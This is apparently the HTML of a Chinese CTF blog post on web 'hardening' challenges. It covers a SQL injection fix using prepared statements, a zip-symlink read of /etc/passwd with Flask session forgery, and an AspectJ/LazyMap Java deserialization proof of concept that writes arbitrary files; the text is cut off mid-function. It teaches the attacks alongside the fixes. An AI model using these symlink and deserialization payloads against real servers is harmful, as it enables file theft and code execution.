@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>加固题学习 | AsaL1n's blog</title><meta name="author" content="AsaL1n"><meta name="copyright" content="AsaL1n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习一下加固题的做法  ezsqlssh连接之后 访问&#x2F;var&#x2F;www&#x2F;html tar打包下载源码 1tar -czvf &#x2F;tmp&#x2F;1.tar.gz ..&#x2F;html  查看源码  输入的参数没有经过任何的过滤 直接就输入到数据库中执行查找 存在sql注入 简单测试一下  写一个正则匹配看一下 123456if(preg_match(&quot;&#x2F;select|an">
+<meta property="og:type" content="article">
+<meta property="og:title" content="加固题学习">
+<meta property="og:url" content="https://asal1n.github.io/2023/04/13/%E5%8A%A0%E5%9B%BA%E9%A2%98/index.html">
+<meta property="og:site_name" content="AsaL1n&#39;s blog">
+<meta property="og:description" content="学习一下加固题的做法  ezsqlssh连接之后 访问&#x2F;var&#x2F;www&#x2F;html tar打包下载源码 1tar -czvf &#x2F;tmp&#x2F;1.tar.gz ..&#x2F;html  查看源码  输入的参数没有经过任何的过滤 直接就输入到数据库中执行查找 存在sql注入 简单测试一下  写一个正则匹配看一下 123456if(preg_match(&quot;&#x2F;select|an">
+<meta property="og:locale">
+<meta property="og:image" content="https://asal1n.github.io/img/head.jpg">
+<meta property="article:published_time" content="2023-04-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-13T07:11:38.954Z">
+<meta property="article:author" content="AsaL1n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://asal1n.github.io/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://asal1n.github.io/2023/04/13/%E5%8A%A0%E5%9B%BA%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '加固题学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-13 15:11:38'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.svg')"><nav id="nav"><span id="blog-info"><a href="/" title="AsaL1n's blog"><span class="site-name">AsaL1n's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页/Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线/Footprints</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 朋友们/Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">加固题学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-12T16:00:00.000Z" title="Created 2023-04-13 00:00:00">2023-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-04-13T07:11:38.954Z" title="Updated 2024-04-13 15:11:38">2024-04-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="加固题学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>学习一下加固题的做法</p>
+</blockquote>
+<h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>ssh连接之后 访问&#x2F;var&#x2F;www&#x2F;html</p>
+<p>tar打包下载源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf /tmp/1.tar.gz ../html</span><br></pre></td></tr></table></figure>
+
+<p>查看源码</p>
+<p><img src="/../../../../img/image-20240412103729286.png"></p>
+<p>输入的参数没有经过任何的过滤 直接就输入到数据库中执行查找 存在sql注入</p>
+<p>简单测试一下</p>
+<p><img src="/../../../../img/image-20240412103855599.png" alt="image-20240412103855599"></p>
+<p>写一个正则匹配看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|and|\&quot;|\&#x27;| |or|\+|=|like|databaese|\\|,|.|&amp;|limit|%|group_concat|schema_name|schemata|extractvalue|~|updatexml|from|union|where|columns|--|show|/i&quot;</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|and|\&quot;|\&#x27;| |or|\+|=|like|databaese|\\|,|.|&amp;|limit|%|group_concat|schema_name|schemata|extractvalue|~|updatexml|from|union|where|columns|--|show|/i&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问check</p>
+<p><img src="/../../../../img/image-20240412103447451.png"></p>
+<p>不幸的是 check没过。</p>
+<p> 既然闭合符号都被过滤了依然不能过check 显然就不是简单的添加blacklist能够过去的</p>
+<h3 id="sql预处理"><a href="#sql预处理" class="headerlink" title="sql预处理"></a>sql预处理</h3><p>预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高 </p>
+<p>同时由于不是直接将相关的参数与已知的sql语句进行拼接 阻止了sql注入的发生</p>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;books&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from books where name = ? AND price = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$price</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$username</span>, <span class="variable">$pawweord</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里首先创建一个mysql连接</p>
+<p>然后创建一个mysqli_prepare()函数</p>
+<p>若执行成功（参数语句正确无误），返回一个statement（STMT）对象；但是如果发生错误，则返回FALSE；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt-&gt;bind_param(&quot;ss&quot;, $name, $price);</span><br></pre></td></tr></table></figure>
+
+<p>将变量绑定到对应的？处 第一个 参数代表的是s代表参数是字符串 </p>
+<p>第二个参数代表的是？所对应的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i - integer（整型）</span><br><span class="line">d - double（双精度浮点型）</span><br><span class="line">s - string（字符串）</span><br><span class="line">b - BLOB（binary large object:二进制对象）</span><br></pre></td></tr></table></figure>
+
+<p>然后执行语句 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt-&gt;execute();</span><br></pre></td></tr></table></figure>
+
+<p>将结果储存在储存语句中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt-&gt;bind_result($username, $pawweord);</span><br></pre></td></tr></table></figure>
+
+<p>添加这个之后 我成功获取了flag</p>
+<p><img src="/../../../../img/image-20240412112301734.png" alt="image-20240412112301734"></p>
+<p><img src="/../../../../img/image-20240412112309654.png" alt="image-20240412112309654"></p>
+<h3 id="特殊字符转义"><a href="#特殊字符转义" class="headerlink" title="特殊字符转义"></a>特殊字符转义</h3><p>看了看网上的wp 很多人使用了<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_addslashes.asp"> addslashes() 函数 </a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</span><br><span class="line">预定义字符是：</span><br><span class="line"></span><br><span class="line">单引号（&#x27;）</span><br><span class="line">双引号（&quot;）</span><br><span class="line">反斜杠（\）</span><br><span class="line">NULL</span><br><span class="line">该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</span><br></pre></td></tr></table></figure>
+
+<p>这样我们注入的时候 非法字符如‘ 就会被过滤 阻止了注入的发生</p>
+<h2 id="CISCN2021-总决赛-babypython"><a href="#CISCN2021-总决赛-babypython" class="headerlink" title="[CISCN2021 总决赛]babypython"></a>[CISCN2021 总决赛]babypython</h2><p>老样子 打包下来看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf /tmp/1.tar.gz /app</span><br></pre></td></tr></table></figure>
+
+<p>关键代码在这里</p>
+<p><img src="/../../../../img/image-20240412143654554.png" alt="image-20240412143654554"></p>
+<p>服务允许我们上传一个zip文件 然后会在服务端进行解压 读取里面的文件内容 读取之后将文件内容显示出来 然后删除相关文件</p>
+<h3 id="unzip软连接攻击"><a href="#unzip软连接攻击" class="headerlink" title="unzip软连接攻击"></a>unzip软连接攻击</h3><p>通过创建一个指向系统文件的软连接 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd shell</span><br></pre></td></tr></table></figure>
+
+<p>然后使用zip压缩为压缩包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r shell.zip shell</span><br></pre></td></tr></table></figure>
+
+<p>然后上传</p>
+<p>在解压的时候 软连接自动指向为我们想要访问的目录</p>
+<p>如果里面包含一句话木马 我们就可以将这个一句话木马上传导指定的目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd shell</span><br><span class="line">echo &#x27;内容&#x27; &gt; 文件</span><br></pre></td></tr></table></figure>
+
+<p>然后访问就可以getshell</p>
+<p>这里我们可以实现读取任意文件</p>
+<p>这里显然是要配合flask伪造</p>
+<h3 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h3><p>uuid是随机生成的字符串 但是他的种子是本地的mac</p>
+<p>我们可以通过读取mac地址  获取uuid生成的随机字符串 计算出key</p>
+<p><img src="/../../../../img/image-20240412145108451.png" alt="image-20240412145108451"></p>
+<p>我们可以上传一个指向mac地址的软连接 获取mac之后计算处key 然后伪造session</p>
+<p><img src="/../../../../img/image-20240412145242341.png" alt="image-20240412145242341"></p>
+<p>伪造即可</p>
+<blockquote>
+<p>这里有个大坑 读取出来的mac和本地ssh链接上去读取的mac的值 不一样</p>
+<p><img src="/../../../../img/image-20240412145410836.png" alt="image-20240412145410836"></p>
+</blockquote>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>修复方法也简单 直接换掉那个使用的库 不用uuid去作为session的key即可</p>
+<h2 id="CISCN2021-总决赛-ezj4va"><a href="#CISCN2021-总决赛-ezj4va" class="headerlink" title="[CISCN2021 总决赛]ezj4va"></a>[CISCN2021 总决赛]ezj4va</h2><p>访问<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载获取到源码</p>
+<p>注意到</p>
+<p><img src="/../../../../img/image-20240413130020890.png" alt="image-20240413130020890"></p>
+<p>调用的方法在这里 </p>
+<p><img src="/../../../../img/image-20240413130647355.png" alt="image-20240413130647355"></p>
+<p><img src="/../../../../img/image-20240413132102780.png" alt="image-20240413132102780"> </p>
+<p>传入的两个值是</p>
+<p>一个来源于直接get传递的参数 一个来源于cookie里面的值</p>
+<h3 id="aspectj链子"><a href="#aspectj链子" class="headerlink" title="aspectj链子"></a>aspectj链子</h3><p>在 <code>org.aspectj.weaver.tools.cache.SimpleCache</code> 类中定义了一个内部类 StoreableCachingMap 提供了一个writeToPath将value写入文件的方法</p>
+<p>在 put方法里面 存在这样的调用</p>
+<p><img src="/../../../../img/image-20240413140502440.png" alt="image-20240413140502440"></p>
+<p>这里会调用writeToPath方法</p>
+<p><img src="/../../../../img/image-20240413140543697.png" alt="image-20240413140543697"></p>
+<p>触发这个put方法 就可以成功写入文件</p>
+<p>lazymap 在transfrom之后 可以调用内部的map的put方法 对结果进行保存 这里就会触发put方法 </p>
+<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.aspectj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span>  org.aspectj.weaver.tools.cache.SimpleCache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> (HashMap)declaredConstructor.newInstance(<span class="string">&quot;D:\\\\&quot;</span>, <span class="number">123</span>);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;evil code&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(map,constantTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;bin.ser&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(hashSet)));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>调用链如下</p>
+<p><img src="/../../../../img/image-20240413141803920.png" alt="image-20240413141803920"></p>
+<p>成功写入文件</p>
+<p><img src="/../../../../img/image-20240413141830823.png" alt="image-20240413141830823"></p>
+<p>回到题目 </p>
+<p>这里没有cc的依赖 我们不能利用tiedmapectry的hashcode触发 lazymap的get方法 我们得寻找其他的方法</p>
+<p>注意到</p>
+<p><img src="/../../../../img/image-20240413143450944.png" alt="image-20240413143450944"></p>
+<p>这里直接就进行了一个put方法 能触发我们的注入</p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6997314123918737422#heading-3">【程序员比赛】CISCN 2021 ezj4va与Fix思路 - 掘金 (juejin.cn)</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">FileInputStream</span>  <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> fis.available();</span><br><span class="line">    System.out.println(size);</span><br><span class="line">    <span class="type">byte</span>[] array = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">    fis.read(array);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(array);</span><br><span class="line">    result = result.replaceAll(<span class="string">&quot;\r|\n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    fis.close();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Cart <span class="title function_">cookiePayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">simpleCache</span> <span class="operator">=</span> ctor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">12</span>); <span class="comment">//获得obj</span></span><br><span class="line">    cart.setSkuDescribe((Map&lt;String, Object&gt;) simpleCache);</span><br><span class="line">    <span class="keyword">return</span> cart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Cart <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Cart</span> <span class="variable">cart</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cart</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> readFile(filepath);</span><br><span class="line">    map.put(<span class="string">&quot;2.txt&quot;</span>,data.getBytes(StandardCharsets.UTF_8)); <span class="comment">//编码</span></span><br><span class="line">    cart.setSkuDescribe(map);</span><br><span class="line">    <span class="keyword">return</span> cart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getURLEncoderString</span><span class="params">(String 